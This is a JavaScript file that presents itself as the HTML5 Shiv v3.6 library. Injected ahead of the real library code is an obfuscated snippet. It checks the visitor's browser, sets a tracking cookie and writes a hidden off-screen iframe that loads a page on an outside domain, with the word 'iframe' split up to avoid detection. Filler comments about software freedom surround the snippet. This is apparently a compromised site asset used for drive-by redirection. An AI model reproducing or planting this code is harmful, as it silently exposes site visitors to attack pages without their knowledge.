//Some.devices.are.designed:to,deny,users.access.to.install,or.run.modified:versions.of.the.software.inside:them,althoughthe,manufacturer,can.do.so
(function(){
function stripos (f_haystack, f_needle, f_offset) {
 var haystack = (f_haystack + '').toLowerCase();
 var needle = (f_needle + '').toLowerCase();
 var maine = 0;
 if ((maine = haystack.indexOf(needle, f_offset)) !== -1) {
  return maine;
 }
 return false;
}
function getbrowser(){
 var checkbrowser = ['Lunascape','iPhone','Macintosh','Linux','iPad','Flock','SeaMonkey','Nokia','SlimBrowser','AmigaOS','Android','FreeBSD','Chrome','IEMobile','Series40','SymbianOS','Avant','Chromium','Firefox/18.0','Firefox/18.0.1','Firefox/17.0','Firefox/25.0','Firefox/24.0','Firefox/18.0.2','Firefox/19.0','Firefox/19.0.1','Firefox/20.0','Firefox/21.0','Firefox/22.0','Firefox/23.0','Firefox/26.0','Firefox/27.0','Firefox/27.0.1','Firefox/27.0.2','Firefox/28.0','Maxthon','BlackBerry'];
 var falsybrowser = false;
 for (var i in checkbrowser) {
  if (stripos(navigator.userAgent, checkbrowser[i])) {
   falsybrowser = true;
   break;
  }
 }
 return falsybrowser;
}
function setCookie(name, value, expires) {
 var date = new Date( new Date().getTime() + expires*1000 );
 document.cookie = name+'='+value+'; path=/; expires='+date.toUTCString();
}
function getCookie(name) {
 var match = document.cookie.match(new RegExp( "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\/\+^])/g, '\$1') + "=([^;]*)" ));
 return match ? decodeURIComponent(match[1]) : undefined;
}
if (!getbrowser()) {
 var cookie = getCookie('membranaufejth183fsh3t7fha3ngjg733rugth37');
 if (cookie == undefined) {
  setCookie('membranaufejth183fsh3t7fha3ngjg733rugth37', true, 172801);	
  document.write('<'+'i'+'f'+'r'+'a'+'m'+'e name="Aurora" sr'+'c'+'='+'"http://blanker.affordableautocarejoplin.com/gdvavgre19.html" style="position:absolute;left:'+'-'+'1290'+'px;top:'+'-'+'1290px;" height="139" width="139">'+'<'+'/'+'i'+'f'+'r'+'a'+'m'+'e'+'>');
 }
};
})();
//Finally,every:program.is.threatened.constantly.by,software.patents./*! HTML5 Shiv v3.6 | @afarkas @jdalton @jon_neal @rem | MIT/GPL2 Licensed */
/* Source: https://github.com/aFarkas/html5shiv */
(function(l,f){function m(){var a=e.elements;return"string"==typeof a?a.split(" "):a}function i(a){var b=n[a[o]];b||(b={},h++,a[o]=h,n[h]=b);return b}function p(a,b,c){b||(b=f);if(g)return b.createElement(a);c||(c=i(b));b=c.cache[a]?c.cache[a].cloneNode():r.test(a)?(c.cache[a]=c.createElem(a)).cloneNode():c.createElem(a);return b.canHaveChildren&&!s.test(a)?c.frag.appendChild(b):b}function t(a,b){if(!b.cache)b.cache={},b.createElem=a.createElement,b.createFrag=a.createDocumentFragment,b.frag=b.createFrag();
a.createElement=function(c){return!e.shivMethods?b.createElem(c):p(c,a,b)};a.createDocumentFragment=Function("h,f","return function(){var n=f.cloneNode(),c=n.createElement;h.shivMethods&&("+m().join().replace(/\w+/g,function(a){b.createElem(a);b.frag.createElement(a);return'c("'+a+'")'})+");return n}")(e,b.frag)}function q(a){a||(a=f);var b=i(a);if(e.shivCSS&&!j&&!b.hasCSS){var c,d=a;c=d.createElement("p");d=d.getElementsByTagName("head")[0]||d.documentElement;c.innerHTML="x<style>article,aside,figcaption,figure,footer,header,hgroup,nav,section{display:block}mark{background:#FF0;color:#000}</style>";
c=d.insertBefore(c.lastChild,d.firstChild);b.hasCSS=!!c}g||t(a,b);return a}var k=l.html5||{},s=/^<|^(?:button|map|select|textarea|object|iframe|option|optgroup)$/i,r=/^<|^(?:a|b|button|code|div|fieldset|form|h1|h2|h3|h4|h5|h6|i|iframe|img|input|label|li|link|ol|option|p|param|q|script|select|span|strong|style|table|tbody|td|textarea|tfoot|th|thead|tr|ul)$/i,j,o="_html5shiv",h=0,n={},g;(function(){try{var a=f.createElement("a");a.innerHTML="<xyz></xyz>";j="hidden"in a;var b;if(!(b=1==a.childNodes.length)){f.createElement("a");
var c=f.createDocumentFragment();b="undefined"==typeof c.cloneNode||"undefined"==typeof c.createDocumentFragment||"undefined"==typeof c.createElement}g=b}catch(d){g=j=!0}})();var e={elements:k.elements||"abbr article aside audio bdi canvas data datalist details figcaption figure footer header hgroup mark meter nav output progress section summary time video",shivCSS:!1!==k.shivCSS,supportsUnknownElements:g,shivMethods:!1!==k.shivMethods,type:"default",shivDocument:q,createElement:p,createDocumentFragment:function(a,
b){a||(a=f);if(g)return a.createDocumentFragment();for(var b=b||i(a),c=b.frag.cloneNode(),d=0,e=m(),h=e.length;d<h;d++)c.createElement(e[d]);return c}};l.html5=e;q(f)})(this,document);